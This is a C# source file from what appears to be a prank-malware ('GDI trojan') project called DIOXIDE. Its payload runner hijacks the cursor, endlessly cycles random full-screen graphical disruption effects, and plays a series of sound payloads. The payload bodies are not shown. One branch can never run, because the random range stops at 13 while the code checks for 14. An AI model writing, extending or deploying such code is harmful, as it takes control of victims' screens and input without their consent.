using System;
using System.Threading;
using static DIOXIDE.run_payloads;
using static DIOXIDE.payloads;
using static DIOXIDE.Functions;

namespace DIOXIDE
{
    class run_payloads
    {
        public static void PStart()
        {
            CreateThreadStart(randGDIPayload_run);
            AudioPayload_run();
            return;
        }

        private static void randGDIPayload_run()
        {
            int True = 1;

            CreateThreadStart(CursorDraw);
            CreateThreadStart(cursor_movement);
            for (; ; )
            {
                Random rnad = new Random();

                int number = rnad.Next(1, 14);

                if (number == 1)
                {
                    CreateThreadStart(gdi2);
                    Thread.Sleep(20000);
                    gdi2_cancel = True;
                }

                if (number == 2)
                {
                    CreateThreadStart(gdi3);
                    Thread.Sleep(20000);
                    gdi3_cancel = True;
                }

                if (number == 3)
                {
                    CreateThreadStart(gdi2);
                    CreateThreadStart(gdi3);
                    Thread.Sleep(20000);
                    gdi2_cancel = True;
                    gdi3_cancel = True;
                }

                if (number == 4)
                {
                    CreateThreadStart(gdi4);
                    Thread.Sleep(20000);
                    gdi4_cancel = True;
                }

                if (number == 5)
                {
                    CreateThreadStart(gdi5);
                    Thread.Sleep(20000);
                    gdi5_cancel = True;
                }

                if (number == 6)
                {
                    CreateThreadStart(gdi6);
                    CreateThreadStart(gdi7);
                    Thread.Sleep(20000);
                    gdi6_cancel = True;
                    gdi7_cancel = True;
                }

                if (number == 7)
                {
                    CreateThreadStart(gdi8);
                    Thread.Sleep(20000);
                    gdi8_cancel = True;
                }
                if (number == 8)
                {
                    CreateThreadStart(gdi9);
                    Thread.Sleep(20000);
                    gdi9_cancel = True;
                }
                if (number == 9)
                {
                    CreateThreadStart(gdi10);
                    Thread.Sleep(20000);
                    gdi10_cancel = True;
                }
                if (number == 10)
                {
                    CreateThreadStart(gdi11);
                    Thread.Sleep(20000);
                    gdi11_cancel = True;
                }
                if (number == 11)
                {
                    CreateThreadStart(gdi12);
                    Thread.Sleep(20000);
                    gdi12_cancel = True;
                }
                if (number == 12)
                {
                    CreateThreadStart(gdi13);
                    Thread.Sleep(20000);
                    gdi13_cancel = True;
                }
                if (number == 13)
                {
                    CreateThreadStart(gdi14);
                    Thread.Sleep(20000);
                    gdi14_cancel = True;
                }
                if (number == 14)
                {
                    CreateThreadStart(gdi15_1);
                    CreateThreadStart(gdi15_2);
                    CreateThreadStart(gdi15_3);
                    CreateThreadStart(gdi15_4);
                    Thread.Sleep(20000);
                    gdi15_1_cancel = True;
                    gdi15_2_cancel = True;
                    gdi15_3_cancel = True;
                    gdi15_4_cancel = True;
                }
            }
        }
        private static void AudioPayload_run()
        {
            Sound1();
            Sound2();
            Sound3();
            Sound4();
            Sound5();
            Sound6();
            Sound7();
            Sound8();
            Sound9();
            Sound10();
            Sound11();
            Sound12();
            Sound13();
            Sound14();
            Sound15();
            Sound16();
            FreezeSound();
            return;
        }
    }
}